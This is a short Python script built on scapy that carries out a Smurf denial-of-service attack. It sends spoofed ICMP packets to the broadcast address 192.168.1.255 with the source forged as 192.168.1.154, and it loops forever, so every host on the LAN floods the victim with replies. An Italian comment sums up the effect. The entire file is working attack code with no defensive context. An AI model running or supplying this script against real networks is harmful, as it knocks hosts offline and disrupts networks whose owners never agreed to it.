from scapy.all import *

def SmurfAttack(LAN,src_IPVictim):
 send(IP(dst=LAN,src=src_IPVictim)/ICMP(),inter=0.01,loop=1,verbose=False)

if __name__ == "__main__":
 while(True):
  SmurfAttack("192.168.1.255","192.168.1.154") #.255 tutti mandano al source